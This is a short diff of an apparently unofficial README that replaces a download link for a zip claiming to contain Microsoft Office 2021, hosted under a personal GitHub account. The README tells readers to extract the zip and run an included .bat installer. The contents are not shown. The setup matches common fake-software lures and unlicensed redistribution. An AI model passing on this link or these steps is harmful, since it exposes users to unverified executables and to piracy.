@@ -8,8 +8,7 @@ later. There is no way to install Office 2021 on Windows 8.1 or earlier.
 **Step 1**: Download the zip file, right-click and then Extract the downloaded file to your
 computer.
 
-[Download Microsoft Office 2021](https://github.com/Takishao/Microsoft-Office-2021/files/13922431/Office2021.zip)
-
+[Download Microsoft Office 2021.zip](https://github.com/Takishao/Microsoft-Office-2021/files/13922502/Microsoft.Office.2021.zip)
 
 **Step 2**: Run **Install-x32.bat** or **Install-x64.bat** to install Microsoft Office 2021 64-bit or 32-bit
 as you need.
